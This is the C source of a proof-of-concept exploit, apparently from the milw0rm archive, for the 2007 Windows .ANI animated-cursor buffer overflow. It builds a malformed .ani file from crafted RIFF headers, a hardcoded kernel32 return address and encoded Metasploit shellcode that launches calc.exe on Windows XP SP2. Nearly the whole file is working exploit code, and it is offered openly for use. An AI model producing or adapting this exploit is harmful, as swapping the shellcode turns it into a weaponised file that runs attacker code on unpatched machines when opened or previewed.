/***************************************************************************
*              MS Windows .ANI File Local Buffer Overflow                  *
*                                                                          *
*                                                                          *
* Credits go to Trirat Puttaraksa cause his PoC inspired this source.      *
* devcode's exploit didnt work for me, so I made my own.                   *
* This exploit launches calc.exe on a lot of app (Word, Winamp, etc...).   *                                       *
* Turn off DEP to get it work on Explorer.                                 *
*                                                                          *
* Tested against Win XP SP2 FR.                                            *
* Have Fun!                                                                *
*                                                                          *
* Coded by Marsu <Marsupilamipowa@hotmail.fr>                              *
***************************************************************************/

#include "stdio.h"
#include "stdlib.h"

/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=164 Encoder=PexFnstenvSub http://metasploit.com */
unsigned char CalcShellcode[] =
"\x29\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x26"
"\x45\x32\xe3\x83\xeb\xfc\xe2\xf4\xda\xad\x76\xe3\x26\x45\xb9\xa6"
"\x1a\xce\x4e\xe6\x5e\x44\xdd\x68\x69\x5d\xb9\xbc\x06\x44\xd9\xaa"
"\xad\x71\xb9\xe2\xc8\x74\xf2\x7a\x8a\xc1\xf2\x97\x21\x84\xf8\xee"
"\x27\x87\xd9\x17\x1d\x11\x16\xe7\x53\xa0\xb9\xbc\x02\x44\xd9\x85"
"\xad\x49\x79\x68\x79\x59\x33\x08\xad\x59\xb9\xe2\xcd\xcc\x6e\xc7"
"\x22\x86\x03\x23\x42\xce\x72\xd3\xa3\x85\x4a\xef\xad\x05\x3e\x68"
"\x56\x59\x9f\x68\x4e\x4d\xd9\xea\xad\xc5\x82\xe3\x26\x45\xb9\x8b"
"\x1a\x1a\x03\x15\x46\x13\xbb\x1b\xa5\x85\x49\xb3\x4e\x3b\xea\x01"
"\x55\x2d\xaa\x1d\xac\x4b\x65\x1c\xc1\x26\x53\x8f\x45\x6b\x57\x9b"
"\x43\x45\x32\xe3";

unsigned char Ani_headers[] = 
"\x52\x49\x46\x46\x13\x03\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
"\x24\x00\x00\x00\x24\x00\x00\x00\xff\xff\x00\x00\x09\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x04\x00\x00\x00\x01\x00\x00\x00\x54\x53\x49\x4c\x03\x00\x00\x00"
"\x00\x00\x00\x00\x54\x53\x49\x4c\x04\x00\x00\x00\x02\x02\x02\x02"
"\x61\x6e\x69\x68\xff\xff\x00\x00";

int main(int argc, char* argv[])
{
	FILE* anifile;
	char evilbuff[66000];
	printf("[+] MS Windows .ANI File Buffer Overflow  \n");
	printf("[+] Greetz to Trirat Puttaraksa\n");
	printf("[+] Coded by Marsu <Marsupilamipowa@hotmail.fr>\n");
	if (argc!=2) {
		printf("[+] Usage: %s <file.ani>\n",argv[0]);
		return 0;
	}
	
	memset(evilbuff,'C',66000);
	memcpy(evilbuff,Ani_headers,sizeof(Ani_headers)-1);
	memcpy(evilbuff+168,"\x7b\x1a\x80\x7c",4); 				/* CALL ESI in Kernel32.dll */
	memcpy(evilbuff+245,CalcShellcode,strlen(CalcShellcode));

	memset(evilbuff+65623,0,1);
	
	if ((anifile=fopen(argv[1],"wb"))==0) {
		printf("[-] Unable to access file.\n");
		return 0;
	}
	fwrite( evilbuff, 1, 65623, anifile );
	fclose(anifile);
	printf("[+] Done. Have fun!\n");
	return 0;
	
}

// milw0rm.com [2007-04-02]
